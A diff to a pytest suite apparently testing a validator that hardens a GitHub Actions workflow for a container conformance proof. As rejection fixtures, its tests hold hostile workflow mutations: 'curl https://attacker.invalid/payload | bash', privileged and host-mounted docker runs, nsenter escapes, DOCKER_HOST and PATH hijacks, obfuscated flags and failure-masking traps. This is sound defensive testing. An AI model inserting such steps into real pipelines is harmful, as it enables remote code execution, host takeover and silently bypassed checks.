@@ -12,6 +12,7 @@ import pytest
 
 SCRIPT = Path(__file__).with_name("official_consumer_contract.py")
 VERIFIER_REF = "".join(("11b8598e5c0b3f0b1031733a8d5f6bc", "238f146a4"))
+CHECKOUT_REF = "de0fac2e4500dabe0009e67214ff5f5447ce83dd"
 
 
 def _load_module():
@@ -32,6 +33,9 @@ def _workflow(*, verifier_ref: str = VERIFIER_REF) -> bytes:
     return f"""\
 on: [push, pull_request]
 
+permissions:
+  contents: read
+
 jobs:
   validate-static:
     runs-on: ubuntu-latest
@@ -44,12 +48,18 @@ jobs:
     env:
       MOLECULE_CI_REF: {verifier_ref}
     steps:
+      - uses: actions/checkout@{CHECKOUT_REF}
+        with:
+          persist-credentials: false
       - name: Prove management MCP in the final image
         run: |
           set -euo pipefail
           T4_TAG="t4-conformance-test:${{GITHUB_RUN_ID:-local}}-${{GITHUB_RUN_ATTEMPT:-1}}"
           CI_ROOT="$RUNNER_TEMP/molecule-ci-${{GITHUB_RUN_ID:-local}}-${{GITHUB_RUN_ATTEMPT:-1}}"
           MCP_ATTESTATION="$RUNNER_TEMP/mcp-attestation-${{GITHUB_RUN_ID:-local}}-${{GITHUB_RUN_ATTEMPT:-1}}.json"
+          MCP_ATTESTATION_TMP="${{MCP_ATTESTATION}}.tmp"
+          MCP_ATTESTATION_SHA256="${{MCP_ATTESTATION}}.sha256"
+          MCP_E2E_LOG="$RUNNER_TEMP/mcp-e2e-${{GITHUB_RUN_ID:-local}}-${{GITHUB_RUN_ATTEMPT:-1}}.log"
           MCP_VERIFY_CONTAINER="mcp-verify-${{GITHUB_RUN_ID:-local}}-${{GITHUB_RUN_ATTEMPT:-1}}"
           git init "$CI_ROOT"
           git -C "$CI_ROOT" remote add origin \
@@ -59,11 +69,22 @@ jobs:
             -C "$CI_ROOT" fetch --no-tags --depth 1 origin "$MOLECULE_CI_REF"
           git -C "$CI_ROOT" checkout -q --detach FETCH_HEAD
           test "$(git -C "$CI_ROOT" rev-parse HEAD)" = "$MOLECULE_CI_REF"
+          git -C "$CI_ROOT" diff --quiet --no-ext-diff --no-textconv "$MOLECULE_CI_REF" -- scripts/mcp_pin_lockstep.py scripts/mcp_built_image_e2e.py
           python3 "$CI_ROOT/scripts/mcp_pin_lockstep.py" --repo-root . --json \
-            > "$MCP_ATTESTATION"
-          EXPECTED_RUNTIME_VERSION="$(python3 - <<'PY'
+            > "$MCP_ATTESTATION_TMP"
+          mv "$MCP_ATTESTATION_TMP" "$MCP_ATTESTATION"
+          sha256sum "$MCP_ATTESTATION" > "$MCP_ATTESTATION_SHA256"
+          git -C "$CI_ROOT" diff --quiet --no-ext-diff --no-textconv "$MOLECULE_CI_REF" -- scripts/mcp_pin_lockstep.py scripts/mcp_built_image_e2e.py
+          sha256sum --check "$MCP_ATTESTATION_SHA256"
+          EXPECTED_RUNTIME_VERSION="$(python3 - "$CI_ROOT" "$MCP_ATTESTATION" <<'PY'
+          import sys
+          from pathlib import Path
+
+          sys.path.insert(0, str(Path(sys.argv[1]) / "scripts"))
           from mcp_built_image_e2e import load_attestation
-          load_attestation(stream)
+
+          with Path(sys.argv[2]).open("rb") as stream:
+              sys.stdout.write(load_attestation(stream).runtime_version)
           PY
           )"
           docker build --build-arg RUNTIME_VERSION="$EXPECTED_RUNTIME_VERSION" \\
@@ -74,10 +95,12 @@ jobs:
             --pids-limit 128 --memory 768m --cpus 1 \\
             --tmpfs /tmp:size=64m --entrypoint python3 "$T4_TAG" \\
             /mcp_built_image_e2e.py
+          git -C "$CI_ROOT" diff --quiet --no-ext-diff --no-textconv "$MOLECULE_CI_REF" -- scripts/mcp_pin_lockstep.py scripts/mcp_built_image_e2e.py
           docker cp "$CI_ROOT/scripts/mcp_built_image_e2e.py" \\
             "$MCP_VERIFY_CONTAINER:/mcp_built_image_e2e.py"
+          sha256sum --check "$MCP_ATTESTATION_SHA256"
           docker start --attach --interactive "$MCP_VERIFY_CONTAINER" \\
-            < "$MCP_ATTESTATION"
+            < "$MCP_ATTESTATION" | tee "$MCP_E2E_LOG"
           grep -qxF 'mcp-built-image-e2e:sentinel:executed' "$MCP_E2E_LOG"
           KEEP_T4_IMAGE=1
   validate:
@@ -85,7 +108,12 @@ jobs:
     needs: [t4-conformance]
     if: always()
     steps:
-      - run: test "${{{{ needs.t4-conformance.result }}}}" = success
+      - run: |
+          set -euo pipefail
+          t4="${{{{ needs.t4-conformance.result }}}}"
+          if [ "$t4" != "success" ]; then
+            exit 1
+          fi
 """.encode()
 
 
@@ -213,6 +241,17 @@ def test_t4_proof_must_reach_a_downstream_required_aggregate() -> None:
         contract.validate_contract("codex", workflow, _test_contract("codex"))
 
 
+def test_t4_proof_must_reach_an_unconditional_always_aggregate() -> None:
+    workflow = _workflow().replace(b"    if: always()\n", b"", 1)
+    assert workflow != _workflow()
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError,
+        match="unconditional always aggregate",
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
 def test_t4_dependency_graph_cannot_hide_the_proof_in_a_cycle() -> None:
     workflow = _workflow().replace(
         b"    needs: validate-static\n",
@@ -227,14 +266,162 @@ def test_t4_dependency_graph_cannot_hide_the_proof_in_a_cycle() -> None:
 
 
 def test_always_aggregate_must_enforce_the_t4_result() -> None:
+    enforced = (
+        b"      - run: |\n"
+        b"          set -euo pipefail\n"
+        b'          t4="${{ needs.t4-conformance.result }}"\n'
+        b'          if [ "$t4" != "success" ]; then\n'
+        b"            exit 1\n"
+        b"          fi\n"
+    )
     workflow = _workflow().replace(
-        b'      - run: test "${{ needs.t4-conformance.result }}" = success\n',
-        b"      - run: echo aggregate-without-enforcement\n",
+        enforced, b"      - run: echo aggregate-without-enforcement\n", 1
+    )
+    assert workflow != _workflow()
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError, match="does not enforce"
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_always_aggregate_assertion_step_must_be_unconditional() -> None:
+    workflow = _workflow().replace(
+        b"      - run: |\n"
+        b"          set -euo pipefail\n"
+        b'          t4="${{ needs.t4-conformance.result }}"\n',
+        b"      - if: ${{ false }}\n"
+        b"        run: |\n"
+        b"          set -euo pipefail\n"
+        b'          t4="${{ needs.t4-conformance.result }}"\n',
         1,
     )
 
     with pytest.raises(
-        contract.OfficialConsumerContractError, match="does not enforce"
+        contract.OfficialConsumerContractError, match="aggregate.*unconditional"
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+@pytest.mark.parametrize(
+    ("needle", "replacement"),
+    (
+        (
+            b"    runs-on: ubuntu-latest\n    needs: [t4-conformance]\n",
+            b"    runs-on: ubuntu-latest\n"
+            b"    defaults:\n"
+            b"      run:\n"
+            b"        shell: bash {0} || true\n"
+            b"    needs: [t4-conformance]\n",
+        ),
+        (
+            b"    needs: [t4-conformance]\n",
+            b"    needs: [t4-conformance]\n"
+            b"    env:\n"
+            b"      BASH_ENV: /tmp/mask-failure.sh\n",
+        ),
+        (
+            b"    if: always()\n    steps:\n      - run: |\n",
+            b"    if: always()\n"
+            b"    steps:\n"
+            b"      - uses: attacker/prepare-mask@main\n"
+            b"      - run: |\n",
+        ),
+    ),
+)
+def test_always_aggregate_has_an_isolated_execution_boundary(
+    needle: bytes, replacement: bytes
+) -> None:
+    workflow = _workflow().replace(needle, replacement, 1)
+    assert workflow != _workflow()
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError,
+        match="always aggregate execution boundary",
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_always_aggregate_cannot_disable_failure_propagation() -> None:
+    enforced = (
+        b"      - run: |\n"
+        b"          set -euo pipefail\n"
+        b'          t4="${{ needs.t4-conformance.result }}"\n'
+        b'          if [ "$t4" != "success" ]; then\n'
+        b"            exit 1\n"
+        b"          fi\n"
+    )
+    masked = (
+        b"      - run: |\n"
+        b"          set -euo pipefail\n"
+        b"          set +e\n"
+        b'          test "${{ needs.t4-conformance.result }}" = success\n'
+        b"          true\n"
+    )
+    workflow = _workflow().replace(enforced, masked, 1)
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError, match="aggregate.*fail closed"
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+@pytest.mark.parametrize(
+    "mutation",
+    (
+        b'          t4="success"\n',
+        b'          echo "${t4:=success}"\n',
+    ),
+)
+def test_always_aggregate_result_binding_cannot_be_rewritten(mutation: bytes) -> None:
+    workflow = _workflow().replace(
+        b'          t4="${{ needs.t4-conformance.result }}"\n',
+        b'          t4="${{ needs.t4-conformance.result }}"\n' + mutation,
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError, match="aggregate.*fail closed"
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def _workflow_with_exact_aggregate_fork_carveout() -> bytes:
+    direct = (
+        b'          if [ "$t4" != "success" ]; then\n            exit 1\n          fi\n'
+    )
+    carveout = (
+        b"          is_fork_pr=\"${{ github.event_name == 'pull_request' && "
+        b'github.event.pull_request.head.repo.fork == true }}"\n'
+        b'          if [ "$t4" != "success" ]; then\n'
+        b'            if [ "$t4" = "skipped" ] && [ "$is_fork_pr" = "true" ]; then\n'
+        b'              echo "::notice::fork-only skip"\n'
+        b"            else\n"
+        b"              exit 1\n"
+        b"            fi\n"
+        b"          fi\n"
+    )
+    workflow = _workflow().replace(direct, carveout, 1)
+    assert workflow != _workflow()
+    return workflow
+
+
+def test_always_aggregate_allows_only_the_exact_fork_skip_carveout() -> None:
+    contract.validate_contract(
+        "codex", _workflow_with_exact_aggregate_fork_carveout(), _test_contract("codex")
+    )
+
+
+def test_always_aggregate_rejects_a_forged_fork_skip_binding() -> None:
+    workflow = _workflow_with_exact_aggregate_fork_carveout().replace(
+        b"is_fork_pr=\"${{ github.event_name == 'pull_request' && "
+        b'github.event.pull_request.head.repo.fork == true }}"',
+        b'is_fork_pr="true"',
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError, match="aggregate.*fail closed"
     ):
         contract.validate_contract("codex", workflow, _test_contract("codex"))
 
@@ -247,6 +434,121 @@ def test_t4_runner_labels_cannot_make_the_proof_unschedulable() -> None:
     )
 
     with pytest.raises(contract.OfficialConsumerContractError, match="runner labels"):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+@pytest.mark.parametrize(
+    ("needle", "replacement", "message"),
+    (
+        (
+            f"actions/checkout@{CHECKOUT_REF}".encode(),
+            b"actions/checkout@main",
+            "immutable allowlisted action",
+        ),
+        (
+            b"          persist-credentials: false",
+            b"          persist-credentials: true",
+            "persist-credentials",
+        ),
+        (
+            b"      - uses: actions/checkout@" + CHECKOUT_REF.encode() + b"\n",
+            b"      - uses: actions/checkout@"
+            + CHECKOUT_REF.encode()
+            + b"\n        if: github.event.pull_request.head.repo.fork != true\n",
+            "unconditional",
+        ),
+        (
+            b"      - name: Prove management MCP in the final image\n",
+            b"      - uses: attacker/action@main\n"
+            b"      - name: Prove management MCP in the final image\n",
+            "immutable allowlisted action",
+        ),
+    ),
+)
+def test_t4_actions_are_immutable_allowlisted_and_credential_free(
+    needle: bytes, replacement: bytes, message: str
+) -> None:
+    workflow = _workflow().replace(needle, replacement, 1)
+
+    with pytest.raises(contract.OfficialConsumerContractError, match=message):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+@pytest.mark.parametrize(
+    ("needle", "replacement", "message"),
+    (
+        (
+            b"permissions:\n  contents: read\n\n",
+            b"",
+            "contents: read permissions",
+        ),
+        (
+            b"permissions:\n  contents: read",
+            b"permissions:\n  contents: write",
+            "contents: read permissions",
+        ),
+        (
+            b"    runs-on: docker-host\n",
+            b"    runs-on: docker-host\n    permissions:\n      contents: write\n",
+            "contents: read permissions",
+        ),
+        (
+            b"    runs-on: docker-host\n",
+            b"    runs-on: docker-host\n    container: attacker/image:latest\n",
+            "container or services",
+        ),
+        (
+            b"    runs-on: docker-host\n",
+            b"    runs-on: docker-host\n"
+            b"    services:\n"
+            b"      daemon:\n"
+            b"        image: attacker/image:latest\n",
+            "container or services",
+        ),
+    ),
+)
+def test_t4_job_keeps_a_least_privilege_runner_boundary(
+    needle: bytes, replacement: bytes, message: str
+) -> None:
+    workflow = _workflow().replace(needle, replacement, 1)
+
+    with pytest.raises(contract.OfficialConsumerContractError, match=message):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+@pytest.mark.parametrize(
+    ("needle", "replacement"),
+    (
+        (
+            b"jobs:\n",
+            b"env:\n  PATH: /tmp/untrusted-bin\n\njobs:\n",
+        ),
+        (
+            b"jobs:\n",
+            b"env:\n  GITHUB_SERVER_URL: https://attacker.invalid\n\njobs:\n",
+        ),
+        (
+            b"      MOLECULE_CI_REF: " + VERIFIER_REF.encode() + b"\n",
+            b"      MOLECULE_CI_REF: "
+            + VERIFIER_REF.encode()
+            + b"\n      DOCKER_HOST: tcp://attacker.invalid:2375\n",
+        ),
+        (
+            b"      - name: Prove management MCP in the final image\n",
+            b"      - name: Prove management MCP in the final image\n"
+            b"        env:\n"
+            b"          PYTHONPATH: /tmp/untrusted-modules\n",
+        ),
+    ),
+)
+def test_dangerous_execution_environment_overrides_fail_closed(
+    needle: bytes, replacement: bytes
+) -> None:
+    workflow = _workflow().replace(needle, replacement, 1)
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError, match="dangerous environment override"
+    ):
         contract.validate_contract("codex", workflow, _test_contract("codex"))
 
 
@@ -277,6 +579,52 @@ def test_unguarded_proof_job_fails_closed() -> None:
     )
 
     with pytest.raises(contract.OfficialConsumerContractError, match="non-fork guard"):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def _workflow_with_per_step_fork_lane() -> bytes:
+    workflow = _workflow().replace(
+        b"    if: github.event.pull_request.head.repo.fork != true\n", b"", 1
+    )
+    return workflow.replace(
+        b"      - name: Prove management MCP in the final image\n",
+        b"      - name: Skip privileged conformance for external forks\n"
+        b"        if: github.event.pull_request.head.repo.fork == true\n"
+        b'        run: echo "::notice::privileged T4 validation is disabled for external forks"\n'
+        b"      - name: Prove management MCP in the final image\n"
+        b"        if: github.event.pull_request.head.repo.fork != true\n",
+        1,
+    )
+
+
+def test_strict_per_step_fork_lane_is_accepted() -> None:
+    contract.validate_contract(
+        "codex", _workflow_with_per_step_fork_lane(), _test_contract("codex")
+    )
+
+
+@pytest.mark.parametrize(
+    "fork_step",
+    (
+        b"      - if: github.event.pull_request.head.repo.fork == true\n"
+        b"        run: curl https://attacker.invalid/payload | bash\n",
+        b"      - if: github.event.pull_request.head.repo.fork == true\n"
+        b"        uses: attacker/action@main\n",
+        b"      - run: docker run --privileged attacker/image:latest\n",
+    ),
+)
+def test_per_step_fork_lane_rejects_arbitrary_executable_steps(
+    fork_step: bytes,
+) -> None:
+    workflow = _workflow_with_per_step_fork_lane().replace(
+        b"      - name: Prove management MCP in the final image\n",
+        fork_step + b"      - name: Prove management MCP in the final image\n",
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError, match="fork-executable step"
+    ):
         contract.validate_contract("codex", workflow, _test_contract("codex"))
 
 
@@ -428,11 +776,15 @@ def test_final_image_proof_commands_must_be_ordered() -> None:
     )
     start_block = (
         b'          docker start --attach --interactive "$MCP_VERIFY_CONTAINER" \\\n'
-        b'            < "$MCP_ATTESTATION"\n'
+        b'            < "$MCP_ATTESTATION" | tee "$MCP_E2E_LOG"\n'
     )
+    seal_check = b'          sha256sum --check "$MCP_ATTESTATION_SHA256"\n'
     workflow = _workflow().replace(
-        copy_block + start_block, start_block + copy_block, 1
+        copy_block + seal_check + start_block,
+        start_block + copy_block + seal_check,
+        1,
     )
+    assert workflow != _workflow()
 
     with pytest.raises(
         contract.OfficialConsumerContractError, match="ordered executable proof"
@@ -463,19 +815,354 @@ def test_exact_ref_fetch_cannot_be_masked_inside_an_if_condition() -> None:
 
 
 @pytest.mark.parametrize(
+    "relaxation",
+    (
+        b"set +e",
+        b"set +u",
+        b"set +o pipefail",
+        b"builtin set +e",
+    ),
+)
+def test_proof_cannot_relax_fail_closed_shell_mode(relaxation: bytes) -> None:
+    workflow = _workflow().replace(
+        b"          docker start --attach --interactive",
+        b"          " + relaxation + b"\n          docker start --attach --interactive",
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError, match="relaxes fail-closed shell mode"
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_post_sentinel_probe_can_manage_its_own_expected_failure() -> None:
+    workflow = _workflow().replace(
+        b"          KEEP_T4_IMAGE=1\n",
+        b"          KEEP_T4_IMAGE=1\n"
+        b"          set +e\n"
+        b"          false\n"
+        b"          set -e\n",
+        1,
+    )
+
+    contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_proof_cannot_shadow_required_commands_through_path() -> None:
+    workflow = _workflow().replace(
+        b'          git init "$CI_ROOT"\n',
+        b'          PATH="/tmp/untrusted-bin:$PATH"\n          git init "$CI_ROOT"\n',
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError, match="dangerous environment override"
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_proof_cannot_shadow_required_commands_with_builtin_hash() -> None:
+    workflow = _workflow().replace(
+        b'          git init "$CI_ROOT"\n',
+        b"          builtin hash -p /tmp/attacker/git git\n"
+        b'          git init "$CI_ROOT"\n',
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError,
+        match="dangerous environment override",
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+@pytest.mark.parametrize(
+    ("needle", "replacement"),
+    (
+        (
+            b'            < "$MCP_ATTESTATION" | tee "$MCP_E2E_LOG"\n',
+            b'            < "$MCP_ATTESTATION" | tee "$MCP_E2E_LOG" || echo ignored\n',
+        ),
+        (
+            b"          grep -qxF 'mcp-built-image-e2e:sentinel:executed' "
+            b'"$MCP_E2E_LOG"\n',
+            b"          grep -qxF 'mcp-built-image-e2e:sentinel:executed' "
+            b'"$MCP_E2E_LOG" || echo ignored\n',
+        ),
+    ),
+)
+def test_verifier_start_and_sentinel_cannot_use_arbitrary_error_masking(
+    needle: bytes, replacement: bytes
+) -> None:
+    workflow = _workflow().replace(needle, replacement, 1)
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError,
+        match="verifier start|sentinel assertion|masks a required command",
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_sentinel_must_assert_the_exact_verifier_output_log() -> None:
+    workflow = (
+        _workflow()
+        .replace(
+            b'          MCP_E2E_LOG="$RUNNER_TEMP/mcp-e2e-',
+            b'          MCP_OTHER_LOG="$RUNNER_TEMP/mcp-other.log"\n'
+            b'          MCP_E2E_LOG="$RUNNER_TEMP/mcp-e2e-',
+            1,
+        )
+        .replace(
+            b"          grep -qxF 'mcp-built-image-e2e:sentinel:executed' "
+            b'"$MCP_E2E_LOG"\n',
+            b"          grep -qxF 'mcp-built-image-e2e:sentinel:executed' "
+            b'"$MCP_OTHER_LOG"\n',
+            1,
+        )
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError, match="different verifier log"
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+@pytest.mark.parametrize(
     "replacement",
     (
-        b"          if False:\n              load_attestation(stream)\n",
-        b"          def decoy():\n              load_attestation(stream)\n",
+        b"          if False:\n"
+        b"              sys.stdout.write(load_attestation(stream).runtime_version)\n",
+        b"          def decoy():\n"
+        b"              sys.stdout.write(load_attestation(stream).runtime_version)\n",
     ),
 )
 def test_attestation_loader_call_must_be_reachable(replacement: bytes) -> None:
     workflow = _workflow().replace(
-        b"          load_attestation(stream)\n", replacement, 1
+        b'          with Path(sys.argv[2]).open("rb") as stream:\n'
+        b"              sys.stdout.write(load_attestation(stream).runtime_version)\n",
+        replacement,
+        1,
     )
 
     with pytest.raises(
         contract.OfficialConsumerContractError, match="hardened attestation load"
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_attestation_loader_cannot_execute_unreviewed_python() -> None:
+    workflow = _workflow().replace(
+        b'          with Path(sys.argv[2]).open("rb") as stream:\n',
+        b'          __import__("os").system('
+        b'"docker run --privileged attacker/image:latest")\n'
+        b'          with Path(sys.argv[2]).open("rb") as stream:\n',
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError,
+        match="reviewed attestation loader",
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_other_pre_sentinel_heredocs_cannot_execute_unreviewed_code() -> None:
+    workflow = _workflow().replace(
+        b'          git -C "$CI_ROOT" diff --quiet --no-ext-diff',
+        b"          python3 - <<'PY'\n"
+        b"          import os\n"
+        b'          os.system("docker run --privileged attacker/image:latest")\n'
+        b"          PY\n"
+        b'          git -C "$CI_ROOT" diff --quiet --no-ext-diff',
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError,
+        match="unreviewed executable heredoc",
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_attestation_loader_must_import_from_the_reviewed_source_root() -> None:
+    workflow = _workflow().replace(
+        b'python3 - "$CI_ROOT" "$MCP_ATTESTATION" <<\'PY\'',
+        b'python3 - "/tmp/forged-root" "$MCP_ATTESTATION" <<\'PY\'',
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError,
+        match="reviewed attestation loader source",
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_attestation_loader_requires_a_fresh_reviewed_tool_content_seal() -> None:
+    seal = (
+        b'          git -C "$CI_ROOT" diff --quiet --no-ext-diff --no-textconv '
+        b'"$MOLECULE_CI_REF" -- scripts/mcp_pin_lockstep.py '
+        b"scripts/mcp_built_image_e2e.py\n"
+    )
+    loader_guard = seal + b'          sha256sum --check "$MCP_ATTESTATION_SHA256"\n'
+    workflow = _workflow().replace(
+        loader_guard,
+        b'          sha256sum --check "$MCP_ATTESTATION_SHA256"\n',
+        1,
+    )
+    assert workflow != _workflow()
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError,
+        match="reviewed attestation loader content seal",
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+@pytest.mark.parametrize(
+    "operation",
+    (
+        b"docker run --privileged attacker/image:latest",
+        b"docker run --volume /:/host attacker/image:latest",
+        b"docker run --pid=host attacker/image:latest",
+        b"sudo nsenter --target 1 --mount -- id -u",
+    ),
+)
+def test_privileged_or_host_bound_operations_cannot_precede_the_sentinel(
+    operation: bytes,
+) -> None:
+    workflow = _workflow().replace(
+        b"          docker create --interactive",
+        b"          " + operation + b"\n          docker create --interactive",
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError,
+        match="privileged or host-bound operation precedes",
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_indirect_docker_privilege_cannot_precede_the_sentinel() -> None:
+    workflow = _workflow().replace(
+        b"          docker create --interactive",
+        b'          HOST_FLAG_A="--privi"\n'
+        b'          HOST_FLAG_B="leged"\n'
+        b'          docker run "$HOST_FLAG_A$HOST_FLAG_B" attacker/image:latest\n'
+        b"          docker create --interactive",
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError,
+        match="privileged or host-bound operation precedes",
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_dynamic_command_dispatch_cannot_hide_pre_sentinel_privilege() -> None:
+    workflow = _workflow().replace(
+        b"          docker create --interactive",
+        b'          CMD_A="dock"\n'
+        b'          CMD_B="er"\n'
+        b'          HOST_FLAG_A="--privi"\n'
+        b'          HOST_FLAG_B="leged"\n'
+        b'          "$CMD_A$CMD_B" run "$HOST_FLAG_A$HOST_FLAG_B" '
+        b"attacker/image:latest\n"
+        b"          docker create --interactive",
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError,
+        match="dynamic command dispatch",
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_cleanup_function_cannot_hide_pre_sentinel_privilege() -> None:
+    workflow = _workflow().replace(
+        b"          set -euo pipefail\n",
+        b"          set -euo pipefail\n"
+        b"          cleanup_t4_build() {\n"
+        b"            docker run --privileged attacker/image:latest\n"
+        b"          }\n"
+        b"          trap cleanup_t4_build EXIT\n",
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError,
+        match="cleanup function contains an unsupported command",
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+@pytest.mark.parametrize(
+    "trap",
+    (
+        b"trap 'exit 0' EXIT",
+        b"builtin trap 'exit 0' EXIT",
+    ),
+)
+def test_exit_trap_cannot_mask_pre_sentinel_failures(trap: bytes) -> None:
+    workflow = _workflow().replace(
+        b"          docker create --interactive",
+        b"          " + trap + b"\n          docker create --interactive",
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError,
+        match="unsupported exit trap",
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_background_work_cannot_race_reviewed_content_seals() -> None:
+    workflow = _workflow().replace(
+        b'          git -C "$CI_ROOT" diff --quiet --no-ext-diff',
+        b'          sh -c \'sleep 1; cp "$1" "$2"\' sh ./forged.py '
+        b'"$CI_ROOT/scripts/mcp_pin_lockstep.py" &\n'
+        b'          git -C "$CI_ROOT" diff --quiet --no-ext-diff',
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError,
+        match="background work before the verifier sentinel",
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_attestation_path_binding_must_be_static_and_run_scoped() -> None:
+    workflow = _workflow().replace(
+        b'          MCP_ATTESTATION="$RUNNER_TEMP/mcp-attestation-'
+        b'${GITHUB_RUN_ID:-local}-${GITHUB_RUN_ATTEMPT:-1}.json"\n',
+        b'          MCP_ATTESTATION="$(mktemp)"\n',
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError,
+        match="dynamic or unsafe MCP_ATTESTATION binding",
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_verifier_container_name_must_be_run_scoped() -> None:
+    workflow = _workflow().replace(
+        b'          MCP_VERIFY_CONTAINER="mcp-verify-'
+        b'${GITHUB_RUN_ID:-local}-${GITHUB_RUN_ATTEMPT:-1}"\n',
+        b'          MCP_VERIFY_CONTAINER="shared-victim"\n',
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError,
+        match="verifier container name is not run-scoped",
     ):
         contract.validate_contract("codex", workflow, _test_contract("codex"))
 
@@ -631,6 +1318,113 @@ def test_lockstep_checker_must_come_from_the_reviewed_fetch() -> None:
         contract.OfficialConsumerContractError, match="unreviewed lockstep checker"
     ):
         contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_lockstep_checker_requires_an_adjacent_git_content_seal() -> None:
+    seal = (
+        b'          git -C "$CI_ROOT" diff --quiet --no-ext-diff --no-textconv '
+        b'"$MOLECULE_CI_REF" -- '
+        b"scripts/mcp_pin_lockstep.py scripts/mcp_built_image_e2e.py\n"
+    )
+    workflow = _workflow().replace(seal, b"", 1)
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError, match="reviewed tool content seal"
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+@pytest.mark.parametrize(
+    ("needle", "replacement"),
+    (
+        (
+            b'          python3 "$CI_ROOT/scripts/mcp_pin_lockstep.py"',
+            b'          cp ./forged.py "$CI_ROOT/scripts/mcp_pin_lockstep.py"\n'
+            b'          python3 "$CI_ROOT/scripts/mcp_pin_lockstep.py"',
+        ),
+        (
+            b'          docker cp "$CI_ROOT/scripts/mcp_built_image_e2e.py"',
+            b'          cp ./forged.py "$CI_ROOT/scripts/mcp_built_image_e2e.py"\n'
+            b'          docker cp "$CI_ROOT/scripts/mcp_built_image_e2e.py"',
+        ),
+    ),
+)
+def test_reviewed_checker_and_verifier_cannot_be_overwritten_before_use(
+    needle: bytes, replacement: bytes
+) -> None:
+    workflow = _workflow().replace(needle, replacement, 1)
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError, match="reviewed tool content seal"
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_attestation_requires_a_content_seal() -> None:
+    workflow = _workflow().replace(
+        b'          sha256sum "$MCP_ATTESTATION" > "$MCP_ATTESTATION_SHA256"\n',
+        b"",
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError, match="attestation content seal"
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_attestation_seal_is_checked_again_immediately_before_start() -> None:
+    check = b'          sha256sum --check "$MCP_ATTESTATION_SHA256"\n'
+    prefix, separator, suffix = _workflow().partition(check)
+    assert separator
+    workflow = prefix + separator + suffix.replace(check, b"", 1)
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError, match="attestation content seal"
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_attestation_cannot_be_rewritten_after_its_content_seal() -> None:
+    workflow = _workflow().replace(
+        b'          sha256sum --check "$MCP_ATTESTATION_SHA256"\n',
+        b'          printf forged > "$MCP_ATTESTATION"\n'
+        b'          sha256sum --check "$MCP_ATTESTATION_SHA256"\n',
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError, match="attestation.*rewritten"
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
